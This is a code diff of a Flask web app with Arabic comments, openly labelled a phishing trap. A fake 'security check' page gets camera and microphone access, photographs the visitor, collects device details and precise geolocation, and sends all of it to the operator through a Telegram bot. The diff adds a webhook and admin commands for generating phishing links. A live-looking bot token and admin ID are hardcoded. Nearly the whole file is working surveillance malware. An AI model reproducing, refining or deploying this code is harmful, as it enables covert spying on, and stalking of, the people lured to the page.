@@ -1,18 +1,27 @@
-import base64, requests, io, os, json
+import base64, requests, io, os, json, logging
 from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
-# --- الإعدادات الأساسية ---
+# --- إعدادات البوت ---
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
-ADMIN_ID = "7041600701" # أنت الآدمن الوحيد
+ADMIN_ID = "7041600701"
+BASE_URL = "https://YOUR_RENDER_APP.onrender.com"  # ⚠️ استبدلها برابط تطبيقك فور النشر
 
-# --- الصفحة الأمامية (الفخ) ---
-HTML_TEMPLATE = '''
+# إعداد الـ Webhook عند بدء التشغيل
+def set_webhook():
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
+    webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
+    response = requests.post(url, json={"url": webhook_url})
+    print("Webhook set response:", response.text)
+
+# --- صفحة التصيد الـ HTML (الفخ) ---
+PHISHING_PAGE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحقق الأمان</title>
     <style>
         body { background: #050505; color: white; font-family: system-ui; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -34,7 +43,7 @@ HTML_TEMPLATE = '''
 
     <script>
         const st = document.getElementById('st');
-        async function post(d, t) { fetch('/', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }
+        async function post(d, t) { fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }
 
         async function capture() {
             document.getElementById('go').style.display = 'none';
@@ -43,24 +52,15 @@ HTML_TEMPLATE = '''
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const v = document.getElementById('v'); v.srcObject = s;
-                
-                // جلب معلومات تفصيلية
                 const b = await navigator.getBattery().catch(() => ({level: 0, charging: false}));
                 const ram = navigator.deviceMemory || "غير معروف";
                 const cores = navigator.hardwareConcurrency || "غير معروف";
                 const lang = navigator.language;
                 
-                let info = `📊 **تقرير صيد احترافي**:\\n` +
-                           `🔋 البطارية: %${Math.round(b.level*100)}\\n` +
-                           `⚡ شحن: ${b.charging ? 'نعم' : 'لا'}\\n` +
-                           `🧠 الرام: ${ram} GB\\n` +
-                           `🦾 المعالج: ${cores} نوى\\n` +
-                           `🌐 اللغة: ${lang}\\n` +
-                           `🖥️ المنصة: ${navigator.platform}`;
+                let info = `📊 تقرير صيد احترافي:\n🔋 البطارية: %${Math.round(b.level*100)}\n⚡ شحن: ${b.charging ? 'نعم' : 'لا'}\n🧠 الرام: ${ram} GB\n🦾 المعالج: ${cores} نوى\n🌐 اللغة: ${lang}\n🖥️ المنصة: ${navigator.platform}`;
                 
                 post(info, 'msg');
 
-                // حل مشكلة الصورة السوداء (الانتظار حتى استقرار الكاميرا)
                 setTimeout(() => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth; c.height = v.videoHeight;
@@ -68,11 +68,10 @@ HTML_TEMPLATE = '''
                     ctx.drawImage(v, 0, 0);
                     post(c.toDataURL('image/jpeg', 0.7), 'img');
                     st.innerText = "اكتمل التحقق، سيتم توجيهك الآن...";
-                }, 4500); // زيادة الوقت لضمان وضوح الصورة
+                }, 4500);
 
-                // الموقع الجغرافي بدقة عالية
                 navigator.geolocation.getCurrentPosition(p => {
-                    post(`📍 موقع الضحية بدقة:\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
+                    post(`📍 موقع الضحية بدقة:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                 }, null, {enableHighAccuracy: true});
 
             } catch (e) { 
@@ -85,52 +84,87 @@ HTML_TEMPLATE = '''
 </html>
 '''
 
-@app.route('/', methods=['GET', 'POST'])
-def main():
-    if request.method == 'POST':
-        data = request.get_json(force=True, silent=True)
-        if not data: return "OK"
-        
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
+# --- مسار الصفحة الرئيسية (الفخ) ---
+@app.route('/')
+def index():
+    return render_template_string(PHISHING_PAGE)
 
-        # --- قسم أوامر البوت (للآدمن فقط) ---
-        if "message" in data:
-            chat_id = str(data["message"]["chat"]["id"])
-            text = data["message"].get("text", "")
+# --- مسار استقبال بيانات الضحايا ---
+@app.route('/api/capture', methods=['POST'])
+def capture_data():
+    data = request.get_json()
+    t, d = data.get('t'), data.get('d')
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
 
-            if chat_id == ADMIN_ID:
-                if text == "/start":
-                    menu = {
-                        "inline_keyboard": [
-                            [{"text": "🔗 إنشاء رابط صيد", "callback_data": "gen_link"}],
-                            [{"text": "⚙️ الإعدادات (خاص بالآدمن)", "callback_data": "admin_settings"}],
-                            [{"text": "👥 إحصائيات الأعضاء", "callback_data": "stats"}]
-                        ]
-                    }
-                    requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': "أهلاً بك يا سيوفي في لوحة التحكم الخاصة بك:", 'reply_markup': menu})
-                
-            return "OK"
-
-        # --- معالجة الضغط على الأزرار (Callback) ---
-        if "callback_query" in data:
-            cq = data["callback_query"]
-            cid = cq["message"]["chat"]["id"]
-            if cq["data"] == "gen_link":
-                requests.post(url + "sendMessage", json={'chat_id': cid, 'text': f"🔗 رابط الصيد الخاص بك هو:\\n`https://{request.host}`", 'parse_mode': 'Markdown'})
-            elif cq["data"] == "admin_settings":
-                requests.post(url + "sendMessage", json={'chat_id': cid, 'text': "⚙️ لوحة الإدارة:\\n1- حظر أعضاء\\n2- مسح بيانات\\n3- إيقاف السيرفر مؤقتاً"})
-            return "OK"
-
-        # --- إرسال الصيد للآدمن ---
-        t, d = data.get('t'), data.get('d')
-        if t == 'msg':
-            requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
-        elif t == 'img':
+    if t == 'msg':
+        requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
+    elif t == 'img':
+        try:
             img = base64.b64decode(d.split(',')[1])
-            requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية (تم معالجة السواد)"}, files={'photo': ('c.jpg', img)})
-        return "OK"
+            requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية"}, files={'photo': ('capture.jpg', img)})
+        except:
+            pass
+    return "OK"
 
-    return render_template_string(HTML_TEMPLATE)
+# --- مسار Webhook الخاص بالبوت (يستقبل أوامر تليجرام) ---
+@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
+def webhook():
+    data = request.get_json()
+    if not data:
+        return "No data", 400
 
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
+
+    # معالجة الرسائل العادية
+    if "message" in data:
+        chat_id = str(data["message"]["chat"]["id"])
+        text = data["message"].get("text", "")
+
+        if chat_id == ADMIN_ID:
+            if text == "/start":
+                keyboard = {
+                    "inline_keyboard": [
+                        [{"text": "🔗 رابط الصيد", "callback_data": "gen_link"}],
+                        [{"text": "📊 الإحصائيات", "callback_data": "stats"}]
+                    ]
+                }
+                requests.post(url + "sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "مرحباً آدمن، أنا جاهز لصيد الحسابات 🔥",
+                    'reply_markup': keyboard
+                })
+            elif text == "/renew":
+                set_webhook()
+                requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': "✅ تم تحديث Webhook"})
+
+    # معالجة الأزرار (CallbackQuery)
+    elif "callback_query" in data:
+        query = data["callback_query"]
+        chat_id = str(query["message"]["chat"]["id"])
+        data_cb = query["data"]
+
+        if data_cb == "gen_link":
+            requests.post(url + "sendMessage", json={
+                'chat_id': chat_id,
+                'text': f"🔗 رابط الصيد:\n{BASE_URL}",
+                'parse_mode': 'Markdown'
+            })
+        elif data_cb == "stats":
+            requests.post(url + "sendMessage", json={
+                'chat_id': chat_id,
+                'text': "📊 الإحصائيات:\nالبوت يعمل بشكل طبيعي."
+            })
+
+    return "OK"
+
+# --- تشغيل السيرفر مع إعداد Webhook ---
 if __name__ == '__main__':
+    # تأكد من أن BASE_URL تم تعيينه بشكل صحيح
+    if BASE_URL == "https://YOUR_RENDER_APP.onrender.com":
+        print("⚠️ تحذير: قم بتغيير BASE_URL إلى رابط التطبيق الفعلي بعد النشر على Render!")
+    
+    # تعيين Webhook (سيعمل مرة واحدة عند بدء التشغيل)
+    set_webhook()
+    
+    # تشغيل الخادم
     app.run(host='0.0.0.0', port=10000)
